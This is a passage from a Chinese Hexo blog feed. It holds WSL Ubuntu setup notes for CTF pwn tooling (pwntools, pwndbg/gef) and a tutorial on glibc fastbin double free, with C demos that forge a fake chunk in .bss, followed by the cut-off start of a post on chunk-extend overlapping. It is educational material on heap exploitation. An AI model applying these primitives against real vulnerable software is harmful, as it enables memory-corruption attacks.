9.0.1 from /usr/lib/python2.7/dist-packages (python 2.7)ubuntu18@DESKTOP-138M681:/usr/bin$ pip3 -Vpip 9.0.1 from /usr/lib/python3/dist-packages (python 3.7)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置32位环境-1"><a href="#配置32位环境-1" class="headerlink" title="配置32位环境"></a>配置32位环境</h3><pre class="line-numbers language-none"><code class="language-none">sudo dpkg --add-architecture i386sudo apt-get updatesudo apt install build-essentialsudo apt install gcc-multilibsudo apt install libssl-devsudo apt install libffi-devsudo apt install rubysudo apt install gemsudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pwngdb、peda、gef一键部署-1"><a href="#pwngdb、peda、gef一键部署-1" class="headerlink" title="pwngdb、peda、gef一键部署"></a>pwngdb、peda、gef一键部署</h3><pre class="line-numbers language-none"><code class="language-none"># https://github.com/apogiatzis/gdb-peda-pwndbg-gef# https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8cd ~ &amp;&amp; git clone https://github.com/apogiatzis/gdb-peda-pwndbg-gef.gitcd ~/gdb-peda-pwndbg-gef./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WSL-ubuntu20-04"><a href="#WSL-ubuntu20-04" class="headerlink" title="WSL ubuntu20.04"></a>WSL ubuntu20.04</h2><h3 id="wsl改位置-2"><a href="#wsl改位置-2" class="headerlink" title="wsl改位置"></a>wsl改位置</h3><pre class="line-numbers language-none"><code class="language-none">首先查看所有分发版本wsl -l --all  -v导出分发版为tar文件到d盘wsl --export Ubuntu-20.04 E:\WSL\ubuntu20.04.tar注销当前分发版wsl --unregister Ubuntu-20.04重新导入并安装分发版在d:ubuntuwsl --import Ubuntu-20.04 E:\WSL\ubuntu20.04 E:\WSL\ubuntu20.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu2004 config --default-user Username删除tar文件(可选)del E:\WSL\ubuntu18.04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="wsl-ubuntu20换源"><a href="#wsl-ubuntu20换源" class="headerlink" title="wsl ubuntu20换源"></a>wsl ubuntu20换源</h3><pre class="line-numbers language-none"><code class="language-none">sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo rm /etc/apt/sources.listsudo vi /etc/apt/sources.listdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversesudo apt-get updatesudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python-pip-1"><a href="#python-pip-1" class="headerlink" title="python pip"></a>python pip</h3><p>自带Python3,8</p><pre class="line-numbers language-none"><code class="language-none">python2:sudo apt install pythonpip2:sudo apt install python-pippip3:sudo apt install python3-pip升级:sudo pip2 install pip-20.3.4-py2.py3-none-any.whl sudo pip2 install pip-20.3.4-py2.py3-none-any.whl <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>nice</p><pre class="line-numbers language-none"><code class="language-none">ubuntu20@DESKTOP-138M681:~$ python -VPython 2.7.17ubuntu20@DESKTOP-138M681:~$ python2 -VPython 2.7.17ubuntu20@DESKTOP-138M681:~$ python3 -VPython 3.8.10ubuntu20@DESKTOP-138M681:~$ pip -Vpip 23.2.1 from /usr/local/lib/python3.8/dist-packages/pip (python 3.8)ubuntu20@DESKTOP-138M681:~$ pip2 -Vpip 20.3.4 from /usr/local/lib/python2.7/dist-packages/pip (python 2.7)ubuntu20@DESKTOP-138M681:~$ pip3 -Vpip 23.2.1 from /usr/local/lib/python3.8/dist-packages/pip (python 3.8)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pwngdb、peda、gef一键部署-2"><a href="#pwngdb、peda、gef一键部署-2" class="headerlink" title="pwngdb、peda、gef一键部署"></a>pwngdb、peda、gef一键部署</h3><pre class="line-numbers language-none"><code class="language-none"># https://github.com/apogiatzis/gdb-peda-pwndbg-gef# https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8cd ~ &amp;&amp; git clone https://github.com/apogiatzis/gdb-peda-pwndbg-gef.gitcd ~/gdb-peda-pwndbg-gef./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="gdb-1"><a href="#gdb-1" class="headerlink" title="gdb"></a>gdb</h3><p><a href="https://ftp.gnu.org/gnu/gdb/">https://ftp.gnu.org/gnu/gdb/</a></p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get remove gdbsudo apt-get purge gdbsudo apt-get install gdb python3.7-dbgtar -xvf gdb-x.x.tar.gzcd gdb-x.xsudo ./configure --with-python=pythonx.xsudo makesudo make installsudo apt-get install python3-devsudo apt-get install libmpfr-devsudo apt-get install libgmp-devexport GMP_LIB=/path/to/gmp/libraryexport GMP_INCLUDE=/path/to/gmp/include<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-none"><code class="language-none">sudo pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntoolssudo pip2 install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="杂七杂八"><a href="#杂七杂八" class="headerlink" title="杂七杂八"></a>杂七杂八</h3><pre class="line-numbers language-none"><code class="language-none">sudo dpkg --add-architecture i386sudo apt-get updatesudo apt install build-essentialsudo apt install gcc-multilibsudo apt install libssl-devsudo apt install libffi-devsudo apt install rubysudo apt install gemsudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wsl-ubuntu22-04"><a href="#wsl-ubuntu22-04" class="headerlink" title="wsl ubuntu22.04"></a>wsl ubuntu22.04</h2><h3 id="改位置-1"><a href="#改位置-1" class="headerlink" title="改位置"></a>改位置</h3><pre class="line-numbers language-none"><code class="language-none">首先查看所有分发版本wsl -l --all  -v导出分发版为tar文件到d盘wsl --export Ubuntu-22.04 E:\WSL\ubuntu22.04.tar注销当前分发版wsl --unregister Ubuntu-22.04重新导入并安装分发版在d:ubuntuwsl --import Ubuntu-22.04 E:\WSL\ubuntu22.04 E:\WSL\ubuntu22.04.tar --version 2设置默认登陆用户为安装时用户名ubuntu2204 config --default-user Username删除tar文件(可选)del E:\WSL\ubuntu22.04.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="换源-2"><a href="#换源-2" class="headerlink" title="换源"></a>换源</h3><pre class="line-numbers language-none"><code class="language-none">sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo rm /etc/apt/sources.listsudo vi /etc/apt/sources.listdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiversesudo apt-get updatesudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="乱七八糟"><a href="#乱七八糟" class="headerlink" title="乱七八糟"></a>乱七八糟</h3><pre class="line-numbers language-none"><code class="language-none">sudo dpkg --add-architecture i386sudo apt-get updatesudo apt install build-essentialsudo apt install gcc-multilibsudo apt install libssl-devsudo apt install libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python3 :  Python 3.10.6</p><pre class="line-numbers language-none"><code class="language-none">python2sudo apt install python2pip3sudo apt install python3-pippip2sudo apt install python2-pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pwntools-1"><a href="#pwntools-1" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-none"><code class="language-none">pip2 install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntoolspip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pwngdb、peda、gef一键部署-3"><a href="#pwngdb、peda、gef一键部署-3" class="headerlink" title="pwngdb、peda、gef一键部署"></a>pwngdb、peda、gef一键部署</h3><pre class="line-numbers language-none"><code class="language-none"># https://github.com/apogiatzis/gdb-peda-pwndbg-gef# https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8cd ~ &amp;&amp; git clone https://github.com/apogiatzis/gdb-peda-pwndbg-gef.gitcd ~/gdb-peda-pwndbg-gef./install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin Double Free</title>
      <link href="/2020/03/17/Fastbin%20Double%20Free/"/>
      <url>/2020/03/17/Fastbin%20Double%20Free/</url>
      
        <content type="html"><![CDATA[<p>double free 是任意地址写的一种技巧，指堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free。</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Fastbin Double Free 能够成功利用主要有两部分的原因： 1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空 2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证 3.我们申请的一块chunk被释放后，它将以单链的形式被串在fastbin中，然后会有一个fast指针指向最后一个链上来了的chunk，当下一个chunk被释放后，将被链在上一个chunk的前面，fast指针向前移动</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_chunk {    INTERNAL_SIZE_T prev_size;  /*前一个chunk的大小*/    INTERNAL_SIZE_T size;       /*当前chunk的大小*/    struct malloc_chunk * fd;   /*指向前一个释放的chunk*/    struct malloc_chunk * bk;   /*指向后一个释放的chunk*/}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在malloc()时，当用户所要求内存大小在 fastbin 的大小范围时，malloc()优先从 fastbin 中拿出 chunk。malloc()会查找与所要求大小相匹配的 fastbin 链表，然后从头部取出 chunk，并将取出 chunk 的 fd 赋给 fastbin 链表头部。这样就从 fastbin 链表的头部中取出了 chunk。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">get_max_fast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>    mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>    mchunkptr pp<span class="token punctuation">;</span>    victim <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>SINGLE_THREAD_P<span class="token punctuation">)</span>        <span class="token operator">*</span>fb <span class="token operator">=</span> victim<span class="token operator">-&gt;</span>fd<span class="token punctuation">;</span>      <span class="token keyword">else</span>        <span class="token function">REMOVE_FB</span><span class="token punctuation">(</span>fb<span class="token punctuation">,</span> pp<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_likely</span><span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token class-name">size_t</span> victim_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span>victim_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token function">malloc_printerr</span><span class="token punctuation">(</span><span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">check_remalloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> p<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于free()时候检查了 fastbin 头部指向的 chunk 和被free()的 chunk 是否相等，即检查是否两次free()了同一个 chunk。所以不能通过直接free()同一个 chunk 来进行 double free。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span>mchunkptr old <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span><span class="token comment">// 这里省略部分代码</span><span class="token comment">/* Check that the top of the bin is not the record we are going to   add (i.e., double free).  */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-&gt;</span>fd <span class="token operator">=</span> old<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>free()还检查了 fastbin 里的 chunk 的 size 大小是否符合该 fastbin 的大小</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Check that size of fastbin chunk at the top is the same as   size of the chunk that we are adding.  We can dereference OLD   only if we have the lock, otherwise it might have already been   allocated again.  */</span><span class="token keyword">if</span> <span class="token punctuation">(</span>have_lock <span class="token operator">&amp;&amp;</span> old <span class="token operator">!=</span> <span class="token constant">NULL</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"invalid fastbin entry (free)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合上面的代码，我们可以通过如下方法绕过检查：分配两个 chunk，分别命名为 chunk0 和 chunk1，然后free(chunk0);free(chunk1);free(chunk0)就可以绕过上面的检查来进行 double free</p><h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unsitd.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span><span class="token operator">*</span>chunk2<span class="token punctuation">,</span><span class="token operator">*</span>chunk3<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk2<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="free-chunk1"><a href="#free-chunk1" class="headerlink" title="free chunk1"></a>free chunk1</h3><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192500985.png"></p><h3 id="free-chunk2"><a href="#free-chunk2" class="headerlink" title="free chunk2"></a>free chunk2</h3><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192514572.png"></p><h3 id="再次free-chunk1"><a href="#再次free-chunk1" class="headerlink" title="再次free chunk1"></a>再次free chunk1</h3><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192530999.png"></p><h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><p>再次分配三个chunk时，就会有两个指针指向同一个chunk</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){    void *chunk1,*chunk2,*chunk3,*chunk3,*chunk4,*chunk5;    chunk1=malloc(0x10);    chunk2=malloc(0x10);    printf("chunk1 addr:%p\n",chunk1);    printf("chunk2 addr:%p\n",chunk2);    free(chunk1);    free(chunk2);    free(chunk1);    printf("------------------------------\n");        chunk3 = malloc(0x10);    chunk4 = malloc(0x10);    chunk5 = malloc(0x10);    printf("chunk3 addr:%p\n",chunk3);    printf("chunk4 addr:%p\n",chunk4);    printf("chunk5 addr:%p\n",chunk5);        return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出</p><pre class="line-numbers language-none"><code class="language-none">chunk1 addr:0x24f7010chunk2 addr:0x24f7030------------------------------chunk3 addr:0x24f7010chunk4 addr:0x24f7030chunk5 addr:0x24f7010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192619550.png"></p><p>fastbin的链表头部是0x602000，fd指针指向的是0x602020，第二次分配给的就是0x602020，那么我们可以伪造一个fd指针，然后再分配的话就会分配到我们伪造的地址上面。伪造的地址上必须存在chunk结构体size字段，并且要符合当前fastbin的大小，才能分配出去。</p><h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdlib.h&gt;typedef struct fake_chunk{    char *prev_seze;    char *size;    char *fd;    char *bk;} chunk;chunk bss_chunk;int (void){    void *chunk1,*chunk2,*chunk3,*chunk4,*chunk5,*chunk6;    printf("bss_chunk addr :%p\n",&amp;bss_chunk);    bss_chunk.size = 0x21;//0x20        chunk1 = malloc(0x10);    chunk2 = malloc(0x10);    printf("chunk1 addr:%p\n",chunk1);    printf("chunk2 addr:%p\n",chunk2);        free(chunk1);    free(chunk2);    free(chunk1);    printf("-------------------------------\n");        chunk3 = malloc(0x10);    *(long long *)chunk3=&amp;bss_chunk;    chunk4 = malloc(0x10);    chunk5 = malloc(0x10);        chunk6 = malloc(0x10);    printf("chunk3 addr:%p\n",chunk3);    printf("chunk4 addr:%p\n",chunk4);    printf("chunk5 addr:%p\n",chunk5);    printf("chunk6 addr:%p\n",chunk6);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三次free"><a href="#三次free" class="headerlink" title="三次free"></a>三次free</h3><p>执行free(chunk1)，free(chunk2)，free(chunk1)之后如下图所示:</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192713213.png"></p><p>此时</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192724213.png"></p><h3 id="第一次malloc"><a href="#第一次malloc" class="headerlink" title="第一次malloc"></a>第一次malloc</h3><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192744885.png"></p><p>malloc分配到chunk1，伪造一个 fake chunk，往 chunk1的数据段中写入 fake chunk 的地址，就可以将 chunk1 的 fd 指向 fake chunk，然后fake chunk 添加进了 fastbin 链表中。如下图所示：</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192800718.png"></p><p>所以当第一次malloc之后</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192812570.png"></p><h3 id="再进行两次malloc-分配chunk2-chunk1"><a href="#再进行两次malloc-分配chunk2-chunk1" class="headerlink" title="再进行两次malloc(分配chunk2,chunk1)"></a>再进行两次malloc(分配chunk2,chunk1)</h3><p>这两次malloc之后分别分配了chunk2和chunk1</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192841164.png"></p><p>此时如下图所示:</p><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192855134.png"></p><h3 id="再进行一次malloc-分配fake-chunk"><a href="#再进行一次malloc-分配fake-chunk" class="headerlink" title="再进行一次malloc(分配fake chunk)"></a>再进行一次malloc(分配fake chunk)</h3><p><img src="/2020/03/17/Fastbin%20Double%20Free/image-20250921192910481.png"></p><p>输出</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bss_chunk addr :0x601080chunk1 addr:0x1dea420chunk2 addr:0x1dea440-------------------------------chunk3 addr:0x1dea420chunk4 addr:0x1dea440chunk5 addr:0x1dea420chunk6 addr:0x601090<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，伪造再bss段上的chunk成功的被分配出去</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastbin attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend原理</title>
      <link href="/2020/03/17/Chunk%20Extend%E5%8E%9F%E7%90%86/"/>
      <url>/2020/03/17/Chunk%20Extend%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.程序中存在堆的漏洞</p><p>2.漏洞可以控制chunk header中的数据</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>ptmalloc中关于chunk的定义</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_chunk {    INTERNAL_SIZE_T prev_size;    INTERNAL_SIZE_T size;    struct malloc_chunk* fd;     struct malloc_chunk* bk;    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */    struct malloc_chunk* bk_nextsize;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当一个chunk为空闲时，至少要有prev_size、size、fd和bk四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小.而当一个chunk被使用时，prev_size可能会被前一个chunk用来存储，fd和bk也会被当作内存存储数据，因此当chunk被使用时，只剩下了size参数需要设置，request2size中的SIZE_SZ就是INTERNAL_SIZE_T类型的大小，因此至少需要req+SIZE_SZ的内存大小。MALLOC_ALIGN_MASK用来对齐，因此request2size就计算出了所需的chunk的大小。</p><p>所以ptmalloc通过chunk header的数据判断chunk的使用情况和对chunk的前后块进行定位，chunk extend就是通过控制size和pre_size域来实现跨越堆块操作从而导致overlapping</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><p>比较常见的利用条件是off-by-one等堆漏洞。假设存在⼀个off-by-one 漏洞，我们目的是构造overlap chunk，则构造过程应该为： 步骤1：申请三个堆块A、B、C，假定它们的size分别为sizeA、sizeB、sizeC，向A中写入数据覆盖到B中的size域，将B的size改为sizeB+sizeC。 步骤2：把B块free掉，此时根据B块的size去找下⼀块chunk的header进行inused bit检查，这里C块是被使用的，所以可以通过检查，通过检查后，free掉的堆块会根据sizeB+sizeC的大小放到bins里面。 